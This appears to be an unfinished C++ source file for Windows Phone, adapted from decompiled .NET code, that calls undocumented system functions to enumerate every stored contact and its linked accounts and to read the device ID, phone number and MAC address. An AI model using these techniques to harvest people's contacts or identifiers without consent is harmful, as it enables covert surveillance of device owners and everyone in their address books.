	_PIMPR_BUSINESS_ADDRESS = 0x10c0001f,
    _PIMPR_BUSINESS_ADDRESS_CITY = 0xc2001f,
    _PIMPR_BUSINESS_ADDRESS_COUNTRY = 0xc5001f,
    _PIMPR_BUSINESS_ADDRESS_POSTAL_CODE = 0xc4001f,
    _PIMPR_BUSINESS_ADDRESS_STATE = 0xc3001f,
    _PIMPR_BUSINESS_ADDRESS_STREET = 0xc1001f,
    _PIMPR_BUSINESS_FAX_NUMBER = 0x9b001f,
    _PIMPR_BUSINESS_TELEPHONE_NUMBER = 0x97001f,
    _PIMPR_BUSINESS2_TELEPHONE_NUMBER = 0x98001f,
    _PIMPR_BUSY_STATUS = 0x450013,
    _PIMPR_CHILDREN = 0xa6001f,
    _PIMPR_COMPANY_NAME = 0x8a001f,
    _PIMPR_COMPANY_TELEPHONE_NUMBER = 0xa0001f,
    _PIMPR_DISPLAY_NAME = 0x10a4001f,
    _PIMPR_EMAIL_ADDRESS = 0x3003001f,
    _PIMPR_EMAIL1_ADDRESS = 0x90001f,
    _PIMPR_EMAIL2_ADDRESS = 0x91001f,
    _PIMPR_EMAIL3_ADDRESS = 0x92001f,
    _PIMPR_FIRST_NAME = 0x82001f,
    _PIMPR_FLOATING_BIRTHDAY = 0xf20040,
    _PIMPR_HOME_ADDRESS = 0x10d0001f,
    _PIMPR_HOME_ADDRESS_CITY = 0xd2001f,
    _PIMPR_HOME_ADDRESS_COUNTRY = 0xd5001f,
    _PIMPR_HOME_ADDRESS_POSTAL_CODE = 0xd4001f,
    _PIMPR_HOME_ADDRESS_STATE = 0xd3001f,
    _PIMPR_HOME_ADDRESS_STREET = 0xd1001f,
    _PIMPR_HOME_FAX_NUMBER = 0x9c001f,
    _PIMPR_HOME_TELEPHONE_NUMBER = 0x99001f,
    _PIMPR_HOME2_TELEPHONE_NUMBER = 0x9a001f,
    _PIMPR_IS_FAVORITE = 0x105000b,
    _PIMPR_JOB_INFO = 0xac001f,
    _PIMPR_JOB_TITLE = 0x8c001f,
    _PIMPR_LAST_NAME = 0x84001f,
    _PIMPR_LOCATION = 0x41001f,
    _PIMPR_MEETING_ORGANIZER_EMAIL = 0x55001f,
    _PIMPR_MEETING_ORGANIZER_NAME = 0x51001f,
    _PIMPR_MIDDLE_NAME = 0x83001f,
    _PIMPR_MOBILE_TELEPHONE_NUMBER = 0x96001f,
    _PIMPR_MOBILE2_TELEPHONE_NUMBER = 0x9e001f,
    _PIMPR_NAME = 0x3001001f,
    _PIMPR_NETWORK_SOURCE_ID = 0x1ae0013,
    _PIMPR_NICKNAME = 0x86001f,
    _PIMPR_OFFICE_LOCATION = 0x8e001f,
    _PIMPR_OTHER_ADDRESS = 0x10e0001f,
    _PIMPR_OTHER_ADDRESS_CITY = 0xe2001f,
    _PIMPR_OTHER_ADDRESS_COUNTRY = 0xe5001f,
    _PIMPR_OTHER_ADDRESS_POSTAL_CODE = 0xe4001f,
    _PIMPR_OTHER_ADDRESS_STATE = 0xe3001f,
    _PIMPR_OTHER_ADDRESS_STREET = 0xe1001f,
    _PIMPR_PAGER_NUMBER = 0x9d001f,
    _PIMPR_SENSITIVITY = 0x210013,
    _PIMPR_SPOUSE = 0xa5001f,
    _PIMPR_START = 0x10420040,
    _PIMPR_SUBJECT = 0x20001f,
    _PIMPR_SUFFIX = 0x85001f,
    _PIMPR_TITLE = 0x81001f,
    _PIMPR_WEB_PAGE = 0xa7001f,
    _PIMPR_YOMI_COMPANY = 0x89001f,
    _PIMPR_YOMI_FIRSTNAME = 0x87001f,
    _PIMPR_YOMI_LASTNAME = 0x88001f
} PIMPR_PROPS;


 /*
internal enum PIMPR_PROPS : uint
{
    PIMPR_ALL_DAY_EVENT = 0x44000b,
    PIMPR_BODY_TEXT = 0x101f001f,
    PIMPR_BUSINESS_ADDRESS = 0x10c0001f,
    PIMPR_BUSINESS_ADDRESS_CITY = 0xc2001f,
    PIMPR_BUSINESS_ADDRESS_COUNTRY = 0xc5001f,
    PIMPR_BUSINESS_ADDRESS_POSTAL_CODE = 0xc4001f,
    PIMPR_BUSINESS_ADDRESS_STATE = 0xc3001f,
    PIMPR_BUSINESS_ADDRESS_STREET = 0xc1001f,
    PIMPR_BUSINESS_FAX_NUMBER = 0x9b001f,
    PIMPR_BUSINESS_TELEPHONE_NUMBER = 0x97001f,
    PIMPR_BUSINESS2_TELEPHONE_NUMBER = 0x98001f,
    PIMPR_BUSY_STATUS = 0x450013,
    PIMPR_CHILDREN = 0xa6001f,
    PIMPR_COMPANY_NAME = 0x8a001f,
    PIMPR_COMPANY_TELEPHONE_NUMBER = 0xa0001f,
    PIMPR_DISPLAY_NAME = 0x10a4001f,
    PIMPR_EMAIL_ADDRESS = 0x3003001f,
    PIMPR_EMAIL1_ADDRESS = 0x90001f,
    PIMPR_EMAIL2_ADDRESS = 0x91001f,
    PIMPR_EMAIL3_ADDRESS = 0x92001f,
    PIMPR_END = 0x10430040,
    PIMPR_FIRST_NAME = 0x82001f,
    PIMPR_FLOATING_BIRTHDAY = 0xf20040,
    PIMPR_HOME_ADDRESS = 0x10d0001f,
    PIMPR_HOME_ADDRESS_CITY = 0xd2001f,
    PIMPR_HOME_ADDRESS_COUNTRY = 0xd5001f,
    PIMPR_HOME_ADDRESS_POSTAL_CODE = 0xd4001f,
    PIMPR_HOME_ADDRESS_STATE = 0xd3001f,
    PIMPR_HOME_ADDRESS_STREET = 0xd1001f,
    PIMPR_HOME_FAX_NUMBER = 0x9c001f,
    PIMPR_HOME_TELEPHONE_NUMBER = 0x99001f,
    PIMPR_HOME2_TELEPHONE_NUMBER = 0x9a001f,
    PIMPR_IS_FAVORITE = 0x105000b,
    PIMPR_JOB_INFO = 0xac001f,
    PIMPR_JOB_TITLE = 0x8c001f,
    PIMPR_LAST_NAME = 0x84001f,
    PIMPR_LOCATION = 0x41001f,
    PIMPR_MEETING_ORGANIZER_EMAIL = 0x55001f,
    PIMPR_MEETING_ORGANIZER_NAME = 0x51001f,
    PIMPR_MIDDLE_NAME = 0x83001f,
    PIMPR_MOBILE_TELEPHONE_NUMBER = 0x96001f,
    PIMPR_MOBILE2_TELEPHONE_NUMBER = 0x9e001f,
    PIMPR_NAME = 0x3001001f,
    PIMPR_NETWORK_SOURCE_ID = 0x1ae0013,
    PIMPR_NICKNAME = 0x86001f,
    PIMPR_OFFICE_LOCATION = 0x8e001f,
    PIMPR_OTHER_ADDRESS = 0x10e0001f,
    PIMPR_OTHER_ADDRESS_CITY = 0xe2001f,
    PIMPR_OTHER_ADDRESS_COUNTRY = 0xe5001f,
    PIMPR_OTHER_ADDRESS_POSTAL_CODE = 0xe4001f,
    PIMPR_OTHER_ADDRESS_STATE = 0xe3001f,
    PIMPR_OTHER_ADDRESS_STREET = 0xe1001f,
    PIMPR_PAGER_NUMBER = 0x9d001f,
    PIMPR_SENSITIVITY = 0x210013,
    PIMPR_SPOUSE = 0xa5001f,
    PIMPR_START = 0x10420040,
    PIMPR_SUBJECT = 0x20001f,
    PIMPR_SUFFIX = 0x85001f,
    PIMPR_TITLE = 0x81001f,
    PIMPR_WEB_PAGE = 0xa7001f,
    PIMPR_YOMI_COMPANY = 0x89001f,
    PIMPR_YOMI_FIRSTNAME = 0x87001f,
    PIMPR_YOMI_LASTNAME = 0x88001f
}

*/


typedef struct _ACCOUNT
{
    unsigned int cProps;
    void * rgPropVals;
    unsigned int fIsDefaultStore;
} ACCOUNT;

class PhoneAccount
{
	private:
		ACCOUNT	*obj;
	public:
		PhoneAccount(ACCOUNT *a) : obj(a) { };

		StorageKind Kind() 
		{ 
			return (obj->fIsDefaultStore) ? StorageKind::Phone : StorageKind::Other; 
		};
		
		LPSTR Name() 
		{ 
			CEPROPVAL *ce = (CEPROPVAL *)obj->rgPropVals; 
			CEPROPVAL *v = &ce[0];

			return (LPSTR) v->val.lpwstr;
		};

};

//class ContactPhoneNumber
//{
//    // Fields
//	private:
//		//List<Account> _accounts = new List<Account>();
//		ACCOUNT	*obj;
//	public:
//    // Methods
//    ContactPhoneNumber()
//    {
//    };
//
//    
//    //public override string ToString()
//    //{
//    //    return string.Format(CultureInfo.CurrentCulture, "{0} ({1})", new object[] { this.PhoneNumber, this.Kind });
//    //}
//
//    // Properties
//    PhoneNumberKind Kind { };
//
//	LPSTR PhoneNumber {  };
//}




class PhoneContact
{
	private:
		CONTACT	*obj;
		ACCOUNT *accounts;

	public:
		PhoneContact(CONTACT *serialized) : obj(serialized)
		{
			/*
				this._phoneNumbers = new List<ContactPhoneNumber>();
				this._emailAddresses = new List<ContactEmailAddress>();
				this._addresses = new List<ContactAddress>();
				this._companies = new List<ContactCompanyInformation>();
				this._websites = new List<string>();
				this._significantOthers = new List<string>();
				this._children = new List<string>();
				this._notes = new List<string>();
				this._birthdays = new List<DateTime>();
				this._accounts = new List<Account>();
			*/
			accounts = (ACCOUNT *) obj->rgAccounts;

		};

		



		int NumberOfAccounts() { return obj->cSources; };
		int SizeOfAccounts() { return obj->cSources * sizeof(ACCOUNT); };


		int CProps() { return obj->cProps; };
		int CAggregatedProps() { return obj->cAggregatedProps; };
		int CSources() { return obj->cSources; };
		int ContactId() { return obj->contactId; };
/*
	unsigned int cProps;
    void *rgPropVals;
    unsigned int cAggregatedProps;
    void *rgAggregatedPropVals;
    unsigned int cSources;
    void *rgAccounts;
    unsigned int contactId;
*/


		PhoneAccount *GetAccount(int i) { return new PhoneAccount(&accounts[i]); };
};

/*
public class Object
{
    // Methods
    public bool Equals(object obj)
    {
        //return RuntimeHelpers.Equals(this, obj);
		return true;
    }

    public bool Equals(object objA, object objB)
    {
        //return ((objA == objB) || (((objA != null) && (objB != null)) && objA.Equals(objB)));
		return true;
    }

    private void FieldGetter(string typeName, string fieldName, ref object val)
    {
        //val = this.GetFieldInfo(typeName, fieldName).GetValue(this);
    }

    private void FieldSetter(string typeName, string fieldName, object val)
    {
		
        //FieldInfo fieldInfo = this.GetFieldInfo(typeName, fieldName);
        //if (fieldInfo.IsInitOnly)
        //{
        //    throw new FieldAccessException(Environment.GetResourceString("FieldAccess_InitOnly"));
        //}
        //Type fieldType = fieldInfo.FieldType;
        //if (fieldType.IsByRef)
        //{
        //    fieldType = fieldType.GetElementType();
        //}
        //if (!fieldType.IsInstanceOfType(val))
        //{
        //    val = Convert.ChangeType(val, fieldType, CultureInfo.InvariantCulture);
        //}
        //fieldInfo.SetValue(this, val);
		
    }

    protected virtual void Finalize()
    {
    }

    private FieldInfo GetFieldInfo(string typeName, string fieldName)
    {
		
        //Type baseType = this.GetType();
        //while (baseType != null)
        //{
        //    if (baseType.FullName.Equals(typeName))
        //    {
        //        break;
        //    }
        //    baseType = baseType.BaseType;
        //}
        //if (baseType == null)
        //{
        //    throw new ArgumentException();
        //}
        //FieldInfo field = baseType.GetField(fieldName, BindingFlags.Public | BindingFlags.Instance | BindingFlags.IgnoreCase);
        //if (field == null)
        //{
        //    throw new ArgumentException();
        //}
        //return field;
		
    }

    public virtual int GetHashCode()
    {
        //return RuntimeHelpers.GetHashCode(this);
    }

    public extern Type GetType();
    protected extern object MemberwiseClone();
    public static bool ReferenceEquals(object objA, object objB)
    {
        //return (objA == objB);
    }

    public virtual string ToString()
    {
       // return this.GetType().ToString();
    }
}
*/



typedef struct _COMPLETENAMEACC
{
    LPCWSTR FirstName;
    LPCWSTR LastName;
    LPCWSTR MiddleName;
    LPCWSTR Nickname;
    LPCWSTR Suffix;
    LPCWSTR Title;
    LPCWSTR YomiFirstName;
    LPCWSTR YomiLastName;
} COMPLETENAMEACC;

//lo stesso utente puo' essere registrato al massimo su 16 account es. Skype, Hotmail, Gmail ecc... sfido ad arrivare a 16
#define MAX_NUM_ACCOUNT 16

typedef struct _CONTACTACC
{
    COMPLETENAMEACC CompleteName;
    LPCWSTR DisplayName;
    unsigned int Id;
    bool IsPinnedToStart;
	unsigned int NumAccount;
	LPCWSTR NameAccount[MAX_NUM_ACCOUNT];
	StorageKind NameAccountKind[MAX_NUM_ACCOUNT]; 
} CONTACTACC;


void AddSingleValuePropertyToContact(CEPROPVAL *v,CONTACTACC* contact)
{	
	 PIMPR_PROPS propid = (PIMPR_PROPS) v->propid;
    if (propid <= _PIMPR_SUFFIX)
    {
        if (propid > _PIMPR_FIRST_NAME)
        {
            switch (propid)
            {
                case _PIMPR_MIDDLE_NAME:
                    //this.EnsureContactHasCompleteName(contact);
                    //contact.CompleteName.MiddleName = this.GetString(cePropVal.val.lpwstr);
					contact->CompleteName.MiddleName=(LPCWSTR)v->val.lpwstr;
                    return;

                case _PIMPR_LAST_NAME:
                    //this.EnsureContactHasCompleteName(contact);
                    //contact.CompleteName.LastName = this.GetString(cePropVal.val.lpwstr);
					contact->CompleteName.LastName=(LPCWSTR)v->val.lpwstr;
                    return;

                case _PIMPR_SUFFIX:
                    //this.EnsureContactHasCompleteName(contact);
                    //contact.CompleteName.Suffix = this.GetString(cePropVal.val.lpwstr);
					contact->CompleteName.Suffix=(LPCWSTR)v->val.lpwstr;
                    return;
            }
            return;
        }
        if (propid == _PIMPR_TITLE)
        {
            //this.EnsureContactHasCompleteName(contact);
            //contact.CompleteName.Title = this.GetString(cePropVal.val.lpwstr);
			contact->CompleteName.Title=(LPCWSTR)v->val.lpwstr;
            return;
        }
        if (propid != _PIMPR_FIRST_NAME)
        {
            return;
        }
    }
    else
    {
        if (propid <= _PIMPR_YOMI_FIRSTNAME)
        {
            if (propid != _PIMPR_NICKNAME)
            {
                if (propid == _PIMPR_YOMI_FIRSTNAME)
                {
                    //this.EnsureContactHasCompleteName(contact);
                    //contact.CompleteName.YomiFirstName = this.GetString(cePropVal.val.lpwstr);
					contact->CompleteName.YomiFirstName=(LPCWSTR)v->val.lpwstr;
                }
                return;
            }
            //this.EnsureContactHasCompleteName(contact);
            //contact.CompleteName.Nickname = this.GetString(cePropVal.val.lpwstr);
			contact->CompleteName.Nickname=(LPCWSTR)v->val.lpwstr;
            return;
        }
        switch (propid)
        {
            case _PIMPR_YOMI_LASTNAME:
                //this.EnsureContactHasCompleteName(contact);
                //contact.CompleteName.YomiLastName = this.GetString(cePropVal.val.lpwstr);
				contact->CompleteName.YomiLastName=(LPCWSTR)v->val.lpwstr;
                return;

            case _PIMPR_IS_FAVORITE:
                //contact.IsPinnedToStart = cePropVal.val.boolVal;
				contact->IsPinnedToStart=(bool)v->val.boolVal;
                return;
        }
        if (propid == _PIMPR_DISPLAY_NAME)
        {
            //contact.DisplayName = this.GetString(cePropVal.val.lpwstr);
			contact->DisplayName=(LPCWSTR)v->val.lpwstr;
        }
        return;
    }
    //this.EnsureContactHasCompleteName(contact);
    //contact.CompleteName.FirstName = this.GetString(cePropVal.val.lpwstr);
	contact->CompleteName.FirstName=(LPCWSTR)v->val.lpwstr;

}

void GetContatti(void)
{
//[SecurityCritical, DllImport("CommsDirectAccessClient.dll", CharSet=CharSet.Unicode)]
//	PoomDataServiceClient_Init
//public static extern uint PoomDataServiceClient_GetObjectsEnumerator(string query, out IntPtr handle);
 

		UINT r=_PoomDataServiceClient_Init();

		DWORD aaa;
		r=_PoomDataServiceClient_GetObjectsEnumerator(L"Contacts: All",&aaa);

		LONG bbb;
		//r=_PoomDataServiceClient_GetStreamLength(aaa,&bbb);

		//internal static extern unsafe uint PoomDataServiceClient_ReadStream(IntPtr handle, int length, byte* buffer, out int read);
		//typedef UINT   (__stdcall  *FunctionFuncPoomDataServiceClient_ReadStream)(DWORD,DWORD,BYTE*,DWORD*);

		BYTE g_array[100];
		DWORD reaaa=NULL;
	///	r=_PoomDataServiceClient_ReadStream(aaa,100,g_array,reaaa);

		/*
		     object[] objectHandles = null;
            PhoneDataSharingContext.MapHrToException(this._interopContext.MoveNext(this._nativeEnumerator, this._optimalBatchSize, ref objectHandles));

			public static extern uint PoomDataServiceClient_MoveNext(IntPtr handle, uint batchSize, ref uint handleCount, [In, Out, MarshalAs(UnmanagedType.LPArray, SizeParamIndex=0)] IntPtr[] objectHandles);
 */
		/****
		UINT ciao;
		BYTE asc[1024];
		r=_PoomDataServiceClient_MoveNext(aaa,100,&ciao,asc); //in ciao mi ritrovo il numero di contatti che ho
		****/
		/*
	  uint num5;
		uint handleCount = 0;
		IntPtr[] ptrArray = new IntPtr[requestedCount];
		uint num3 = PoomInteropMethods.PoomDataServiceClient_MoveNext((IntPtr) handle, requestedCount, ref handleCount, ptrArray);
		*/

		#define REQ_COUNT 100
		UINT requestedCount=REQ_COUNT;
		UINT handleCount;
		DWORD ptrArray[REQ_COUNT];

			r=_PoomDataServiceClient_MoveNext(aaa,requestedCount,&handleCount,ptrArray); //in handleCount mi ritrovo il numero di contatti che ho

			CONTACT **contacts = (CONTACT **) ptrArray;
			
			int sum = 0;

			CONTACT* ptrArr;
			SOURCEDPROPVAL* ptrS;
			PSOURCEDPROPVAL* ptrPS;

			ACCOUNT* ptrAcc;
			CONTACT* ptrCon;

			//StorageKind accountKind;

			for(int i=0; i < handleCount; i++)
			{
				WCHAR msg[128];
				swprintf_s(msg, L">>>Numero Account=%i<<<\n",i);
				OutputDebugString(msg);

				ptrArr=contacts[i];

				//deserializzo CONTACT // CONTACTSerializer 
				CONTACTACC contact={0};
				contact.Id=ptrArr->contactId;
				for(int j=0; j<ptrArr->cProps; j++)
				{

					CEPROPVAL *ce = (CEPROPVAL *)ptrArr->rgPropVals+j; 
					CEPROPVAL *v = ce;

					
					AddSingleValuePropertyToContact(v,&contact);

				}



				OutputDebugString(contact.DisplayName);

				//deserializzo ACCOUNT // AccountSerializer 
				contact.NumAccount=ptrArr->cSources;
				for(int j=0; j<ptrArr->cSources&&j<MAX_NUM_ACCOUNT; j++)
				{ 
					ptrAcc=(ACCOUNT*)ptrArr->rgAccounts+j;
					
					if (ptrAcc->fIsDefaultStore != 0)
					{
						contact.NameAccountKind[j] = StorageKind::Phone;
					}
					else
					{
						contact.NameAccountKind[j] = StorageKind::Other;
					}


					  for (int k = 0; k < ptrAcc->cProps; k++)
					  {
						 CEPROPVAL *ce = (CEPROPVAL *)ptrAcc->rgPropVals+k; 
						 CEPROPVAL *v = ce;

						
						switch (v->propid)
						{
							case _PIMPR_NETWORK_SOURCE_ID:
							{
								NETWORK_SOURCE_ID ulVal = (NETWORK_SOURCE_ID) v->val.ulVal;
								if (ulVal != NETWORK_SOURCE_ID::NWindowsLive)
								{
									if (ulVal == NETWORK_SOURCE_ID::NFacebook)
									{
										goto Label_00D8;
									}
									if (ulVal == NETWORK_SOURCE_ID::NOutlook)
									{
										goto Label_00E1;
									}
								}
								else
								{
									contact.NameAccountKind[j] = StorageKind::WindowsLive;
								}
								break;
							}
							case _PIMPR_NAME:
								contact.NameAccount[j]=v->val.lpwstr;
								OutputDebugString(v->val.lpwstr);
								OutputDebugString(L":");
								break;
						}
						continue;
					Label_00D8:
						contact.NameAccountKind[j] = StorageKind::Facebook;
						continue;
					Label_00E1:
						contact.NameAccountKind[j] = StorageKind::Outlook;
					  }

					  switch (contact.NameAccountKind[j])
					  {
						  case Phone:
							  OutputDebugString(L"Phone\n");
							  break;
						  case WindowsLive:
							  OutputDebugString(L"WindowsLive\n");
							  break;
						  case Outlook:
							  OutputDebugString(L"Outlook\n");
							  break;
						  case Facebook:
							  OutputDebugString(L"Facebook\n");
							  break;
						  case Other:
							  OutputDebugString(L"Other\n");
							  break;
						  default:
							   OutputDebugString(L"default Other\n");
							  break;
					  }
				}
				
			OutputDebugString(L"\n");
				
			/*
				//
				for(int j=0; j<ptrArr->cAggregatedProps; j++)
				{ 		
					ptrS=(SOURCEDPROPVAL*)ptrArr->rgAggregatedPropVals+j;
					//ptrS=ptrS+sizeof(SOURCEDPROPVAL)*j;
					ptrPS=((PSOURCEDPROPVAL*)ptrS->pPropVal);

					switch (ptrPS->PIMPR_PROPS)
					{
						case _PIMPR_ALL_DAY_EVENT:
							OutputDebugString(L"_PIMPR_ALL_DAY_EVENT\n");
							break;
						case _PIMPR_BODY_TEXT :
							OutputDebugString(L"_PIMPR_BODY_TEXT \n");
							break;
						case _PIMPR_BUSINESS_ADDRESS :
							OutputDebugString(L"_PIMPR_BUSINESS_ADDRESS \n");
							break;
						case _PIMPR_BUSINESS_ADDRESS_CITY :
							OutputDebugString(L"_PIMPR_BUSINESS_ADDRESS_CITY \n");
							break;
						case _PIMPR_BUSINESS_ADDRESS_COUNTRY :
							OutputDebugString(L"_PIMPR_BUSINESS_ADDRESS_COUNTRY \n");
							break;
						case _PIMPR_BUSINESS_ADDRESS_POSTAL_CODE :
							OutputDebugString(L"_PIMPR_BUSINESS_ADDRESS_POSTAL_CODE \n");
							break;
						case _PIMPR_BUSINESS_ADDRESS_STATE :
							OutputDebugString(L"_PIMPR_BUSINESS_ADDRESS_STATE \n");
							break;
						case _PIMPR_BUSINESS_ADDRESS_STREET :
							OutputDebugString(L"_PIMPR_BUSINESS_ADDRESS_STREET \n");
							break;
						case _PIMPR_BUSINESS_FAX_NUMBER :
							OutputDebugString(L"_PIMPR_BUSINESS_FAX_NUMBER \n");
							break;
						case _PIMPR_BUSINESS_TELEPHONE_NUMBER :
							OutputDebugString(L"_PIMPR_BUSINESS_TELEPHONE_NUMBER \n");
							break;
						case _PIMPR_BUSINESS2_TELEPHONE_NUMBER :
							OutputDebugString(L"_PIMPR_BUSINESS2_TELEPHONE_NUMBER \n");
							break;
						case _PIMPR_BUSY_STATUS :
							OutputDebugString(L"_PIMPR_BUSY_STATUS \n");
							break;
						case _PIMPR_CHILDREN :
							OutputDebugString(L"_PIMPR_CHILDREN \n");
							break;
						case _PIMPR_COMPANY_NAME :
							OutputDebugString(L"_PIMPR_COMPANY_NAME \n");
							break;
						case _PIMPR_COMPANY_TELEPHONE_NUMBER :
							OutputDebugString(L"_PIMPR_COMPANY_TELEPHONE_NUMBER \n");
							break;
						case _PIMPR_DISPLAY_NAME :
							OutputDebugString(L"_PIMPR_DISPLAY_NAME \n");
							break;
						case _PIMPR_EMAIL_ADDRESS :
							OutputDebugString(L"_PIMPR_EMAIL_ADDRESS \n");
							break;
						case _PIMPR_EMAIL1_ADDRESS :
							OutputDebugString(L"_PIMPR_EMAIL1_ADDRESS \n");
							break;
						case _PIMPR_EMAIL2_ADDRESS :
							OutputDebugString(L"_PIMPR_EMAIL2_ADDRESS \n");
							break;
						case _PIMPR_EMAIL3_ADDRESS :
							OutputDebugString(L"_PIMPR_EMAIL3_ADDRESS \n");
							break;
						case _PIMPR_FIRST_NAME :
							OutputDebugString(L"_PIMPR_FIRST_NAME \n");
							break;
						case _PIMPR_FLOATING_BIRTHDAY :
							OutputDebugString(L"_PIMPR_FLOATING_BIRTHDAY \n");
							continue;
							break;
						case _PIMPR_HOME_ADDRESS :
							OutputDebugString(L"_PIMPR_HOME_ADDRESS \n");
							break;
						case _PIMPR_HOME_ADDRESS_CITY :
							OutputDebugString(L"_PIMPR_HOME_ADDRESS_CITY \n");
							break;
						case _PIMPR_HOME_ADDRESS_COUNTRY :
							OutputDebugString(L"_PIMPR_HOME_ADDRESS_COUNTRY \n");
							break;
						case _PIMPR_HOME_ADDRESS_POSTAL_CODE :
							OutputDebugString(L"_PIMPR_HOME_ADDRESS_POSTAL_CODE \n");
							break;
						case _PIMPR_HOME_ADDRESS_STATE :
							OutputDebugString(L"_PIMPR_HOME_ADDRESS_STATE \n");
							break;
						case _PIMPR_HOME_ADDRESS_STREET :
							OutputDebugString(L"_PIMPR_HOME_ADDRESS_STREET \n");
							break;
						case _PIMPR_HOME_FAX_NUMBER :
							OutputDebugString(L"_PIMPR_HOME_FAX_NUMBER \n");
							break;
						case _PIMPR_HOME_TELEPHONE_NUMBER :
							OutputDebugString(L"_PIMPR_HOME_TELEPHONE_NUMBER \n");
							break;
						case _PIMPR_HOME2_TELEPHONE_NUMBER :
							OutputDebugString(L"_PIMPR_HOME2_TELEPHONE_NUMBER \n");
							break;
						case _PIMPR_IS_FAVORITE :
							OutputDebugString(L"_PIMPR_IS_FAVORITE \n");
							break;
						case _PIMPR_JOB_INFO :
							OutputDebugString(L"_PIMPR_JOB_INFO \n");
							break;
						case _PIMPR_JOB_TITLE :
							OutputDebugString(L"_PIMPR_JOB_TITLE \n");
							break;
						case _PIMPR_LAST_NAME :
							OutputDebugString(L"_PIMPR_LAST_NAME \n");
							break;
						case _PIMPR_LOCATION :
							OutputDebugString(L"_PIMPR_LOCATION \n");
							break;
						case _PIMPR_MEETING_ORGANIZER_EMAIL :
							OutputDebugString(L"_PIMPR_MEETING_ORGANIZER_EMAIL \n");
							break;
						case _PIMPR_MEETING_ORGANIZER_NAME :
							OutputDebugString(L"_PIMPR_MEETING_ORGANIZER_NAME \n");
							break;
						case _PIMPR_MIDDLE_NAME :
							OutputDebugString(L"_PIMPR_MIDDLE_NAME \n");
							break;							  
						case _PIMPR_MOBILE_TELEPHONE_NUMBER  :
							OutputDebugString(L"_PIMPR_MOBILE_TELEPHONE_NUMBER  \n");
							break;
						case _PIMPR_MOBILE2_TELEPHONE_NUMBER :
							OutputDebugString(L"_PIMPR_MOBILE2_TELEPHONE_NUMBER \n");
							break;
						case _PIMPR_NAME :
							OutputDebugString(L"_PIMPR_NAME \n");
							break;
						case _PIMPR_NETWORK_SOURCE_ID :
							OutputDebugString(L"_PIMPR_NETWORK_SOURCE_ID \n");
							break;
						case _PIMPR_NICKNAME :
							OutputDebugString(L"_PIMPR_NICKNAME \n");
							break;
						case _PIMPR_OFFICE_LOCATION :
							OutputDebugString(L"_PIMPR_OFFICE_LOCATION \n");
							break;
						case _PIMPR_OTHER_ADDRESS :
							OutputDebugString(L"_PIMPR_OTHER_ADDRESS \n");
							break;
						case _PIMPR_OTHER_ADDRESS_CITY :
							OutputDebugString(L"_PIMPR_OTHER_ADDRESS_CITY \n");
							break;
						case _PIMPR_OTHER_ADDRESS_COUNTRY :
							OutputDebugString(L"_PIMPR_OTHER_ADDRESS_COUNTRY \n");
							break;
						case _PIMPR_OTHER_ADDRESS_POSTAL_CODE :
							OutputDebugString(L"_PIMPR_OTHER_ADDRESS_POSTAL_CODE \n");
							break;
						case _PIMPR_OTHER_ADDRESS_STATE :
							OutputDebugString(L"_PIMPR_OTHER_ADDRESS_STATE \n");
							break;
						case _PIMPR_OTHER_ADDRESS_STREET :
							OutputDebugString(L"_PIMPR_OTHER_ADDRESS_STREET \n");
							break;
						case _PIMPR_PAGER_NUMBER :
							OutputDebugString(L"_PIMPR_PAGER_NUMBER \n");
							break;
						case _PIMPR_SENSITIVITY :
							OutputDebugString(L"_PIMPR_SENSITIVITY \n");
							break;
						case _PIMPR_SPOUSE :
							OutputDebugString(L"_PIMPR_SPOUSE \n");
							break;
						case _PIMPR_START :
							OutputDebugString(L"_PIMPR_START \n");
							break;
						case _PIMPR_SUBJECT :
							OutputDebugString(L"_PIMPR_SUBJECT \n");
							break;
						case _PIMPR_SUFFIX :
							OutputDebugString(L"_PIMPR_SUFFIX \n");
							break;
						case _PIMPR_TITLE :
							OutputDebugString(L"_PIMPR_TITLE \n");
							break;
						case _PIMPR_WEB_PAGE :
							OutputDebugString(L"_PIMPR_WEB_PAGE \n");
							break;
						case _PIMPR_YOMI_COMPANY :
							OutputDebugString(L"_PIMPR_YOMI_COMPANY \n");
							break;
						case _PIMPR_YOMI_FIRSTNAME :
							OutputDebugString(L"_PIMPR_YOMI_FIRSTNAME \n");
							break;
						case _PIMPR_YOMI_LASTNAME  :
							OutputDebugString(L"_PIMPR_YOMI_LASTNAME  \n");
							break;


						default:
							OutputDebugString(L"NON RICONOSCIUTO\n");
							break;
					}
					


					if((DWORD)(ptrPS->lpwstr)!=1)
					{
						OutputDebugString((LPCWSTR)ptrPS->lpwstr);
					}
					
					OutputDebugString(L"\n");

				}

				*/
			}


			for(int i=0; i < handleCount; i++)
			{
				//sum += contacts[i]->contactId;

				PhoneContact c(contacts[i]);

				int r1=c.ContactId();
				int r2=c.NumberOfAccounts();

				PhoneAccount *a = c.GetAccount(0);

				LPSTR lpName = a->Name();
				
				OutputDebugString((LPCWSTR)lpName);

				//a->NameV2();
				
				//OutputDebugString((LPCWSTR)lpNameV2);

			}

			
			/*typedef bool   (__stdcall  *ptrArray_MoveNext)();
			ptrArray_MoveNext _PoomDataServiceClient_MoveNext;
			_PoomDataServiceClient_MoveNext=(ptrArray_MoveNext)(*(ptr+1));
			
			//bool ii=_PoomDataServiceClient_MoveNext();



			ObjectContacts ObjectC[REQ_COUNT];
			ObjectContacts* ptrObjectC= new ObjectContacts();
			ptrObjectC=(ObjectContacts*)ptrArray[0];
			ptrObjectC[0].pub1();*/



			//ripartire da:
			/*
			public uint MoveNext(object handle, uint requestedCount, ref object[] objectHandles)
{
    uint num5;
    uint handleCount = 0;
    IntPtr[] ptrArray = new IntPtr[requestedCount];
    uint num3 = PoomInteropMethods.PoomDataServiceClient_MoveNext((IntPtr) handle, requestedCount, ref handleCount, ptrArray);
    try
    {
        objectHandles = new object[handleCount];
        switch (num3)
        {
            case 0:
                for (int i = 0; i < handleCount; i++)
                {
                    objectHandles[i] = ptrArray[i];
                }
                break;

            case 0x80070490:
                num3 = 0;
                break;
        }
        num5 = num3;
    }
    catch (Exception)
    {
        for (int j = 0; j < handleCount; j++)
        {
            this.FreeObject(ptrArray[j]);
        }
        throw;
    }
    return num5;
}

			*/

 

}

void testVari(void)
{
	GetContatti();

	HRESULT AAA=ContactChooserExample();

		BYTE array[20];
	_DevicePropertiesGetUniqueDeviceId(array,sizeof(array));

	WCHAR Phonenum[64];

	_GetPhoneNumber(Phonenum);

	BYTE MAC[128];
	_GetMACAddress(MAC);

	/*
	byte[] array = new byte[20];
				DeviceInfoNativeMethods.GetUniqueDeviceId(array, (uint)array.Length);
				propertyValue = array;
				*/



	 WCHAR stringBuilder[256];
	
	 /*
	 public enum PhoneKeys
{
